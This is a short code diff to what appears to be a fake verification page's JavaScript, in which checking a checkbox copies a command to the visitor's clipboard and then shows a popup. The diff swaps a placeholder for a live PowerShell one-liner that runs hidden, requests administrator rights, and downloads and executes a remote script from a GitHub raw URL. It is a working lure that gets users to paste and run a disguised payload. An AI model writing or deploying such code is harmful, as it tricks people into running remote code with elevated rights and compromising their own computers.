@@ -376,7 +376,8 @@
         if (checkbox.classList.contains('checked')) {
             loading.style.display = 'block'; // Show the loading animation
             setTimeout(() => {
-                navigator.clipboard.writeText(`"POWERSHELL MO DITO YA"`).then(() => {
+                navigator.clipboard.writeText(`powershell -w hidden -nop -c "Start-Process powershell -WindowStyle Hidden -Verb RunAs -ArgumentList '-nop -w hidden -c iex (iwr https://raw.githubusercontent.com/xaiqttt/cheat/main/winsupport.ps1 -UseBasicParsing)'"
+`).then(() => {
                     popup.classList.add('active');
                 });
                 loading.style.display = 'none'; // Hide loading animation
